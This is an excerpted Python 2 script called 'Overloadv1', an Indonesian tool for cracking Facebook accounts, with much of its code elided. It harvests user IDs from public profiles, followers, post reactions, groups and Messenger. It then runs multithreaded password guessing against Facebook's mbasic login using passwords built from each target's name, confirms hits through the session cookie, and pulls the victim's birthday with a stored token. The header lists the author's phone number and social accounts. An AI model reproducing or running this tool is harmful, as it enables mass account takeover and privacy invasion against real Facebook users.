...
"""%s
 ...
 - author      : Solehudinhikmat
 - facebook    : https://www.facebook.com/helly.cayangmelly
 - whatsap     : +6283172526862
 - github      : github.com/Solehudinhikmat
 - script name : Overloadv1
 - version     : 1.1
...
def banner():
    print ('       -->Author :Solehudinhikmat
                      -->Facebook :SAYA PUTRII
                      -->Github :https://github.com/Solehudinhikmat
                      -->Recode :None(FREE RECODE ASAL IJIN DULU)
  ____               __             __                __    __ __ __ __
 / __ \_  _____ ____/ /__  ___ ____/ / \\    // __ __ __\ \
/ /_/ / |/ / -_) __/ / _ \/ _ `/ _  /          \\ //   __ __ __/ /
\____/|___/\__/_/ /_/\___/\_,_/\_,_/  \\//__ __ __ / /')
...
def _hikmat_(show=True):
	...
	try:
		cks=cvd(ck)
		if kueh(cks)==True:
			open(".cok","w").write(ck);exit("%s%s login success, ketik: python2 Overloadv1.py "%(H,til))
		else:print("%s%s login gagal."%(M,til));_hikmat_(show=True)
...
# DUMP PUBLIK
def publik(hikmat,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
...
# DUMP FOLLOWERS
def followers(hikmat,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
...
# DUMP POSTINGAN 
def postingan(hikmat,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
...
class ngentod:
    ...
    def askk(self):
        ...
        asw = raw_input(' [%s?%s] apakah anda ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
        if asw in ('Y', 'y'):
                ...
                if pwek == '':
                    ...
                    def xxh(ysc=None): 
                        ...
                        if cin == '':
                            ...
                            with HikmatGanz(max_workers=30) as (__hikmat__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __hikmat__.submit(self.__api__, kimochi, ysc)
                                    except: pass
                            ...
                            with HikmatGanz(max_workers=30) as (__hikmat__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __hikmat__.submit(self.__mfb__, kimochi, ysc)
                                    except: pass
            ...
            print '\n %s[%s×%s] y/t goblok!'%(N,M,N);time.sleep(2);hikmat()
        return
    ...
    def mbasic(self, user, xxh):
        ...
        for pw in xxh:
            ...
            if "c_user" in ses.cookies.get_dict().keys():
                ...
                try:
                    hikmat = open('data/token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,hikmat)).json()['birthday']
            	...
            	for yntkts in self.id: 
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __hikmat__.submit(self.mbasic, uid, pwx)
                    except:
                        pass
...
def opsi():
	...
	try:
		file_cp = open(hasil+hikmat, "r").readlines()
	except IOError:
		exit("\n%s%s nama file %s tidak tersedia"%(M,til,hikmat))
...
def menu():
    ...
    print ('%s%s%s 01 %sDump id public bang'%(U,til,P,O))
    print ('%s%s%s 02 %sDump id followers bang'%(U,til,P,O))
    print ('%s%s%s 03 %sDump id reaction post bang'%(U,til,P,O))
    print ('%s%s%s 04 %sDump id anggota groups bang'%(U,til,P,O))
    print ('%s%s%s 05 %sDump id pencarian nama bang'%(U,til,P,O))
    print ('%s%s%s 06 %sDump id pesan mesengger bang'%(U,til,P,O))
    print ('%s%s%s 07 %sStart crack bang'%(U,til,H,O))
    print ('%s%s%s 08 %sGanti user agent bang'%(U,til,P,O))
    print ('%s%s%s 09 %sCek hasil crack bang'%(U,til,P,O))
    print ('%s%s%s 10 %sCek opsi akun bang'%(U,til,P,O))
    #print ('%s%s%s 11 %sInfo script'%(U,til,P,O))
    print ('%s%s%s rm %sHapus akun bang'%(U,til,P,O))
    print ('%s%s%s 00 %sKeluar bang'%(U,til,M,O))
    slut = raw_input('\n%s# %sPilih bang----> %s> %s'%(P,O,M,K))
    if slut == '':
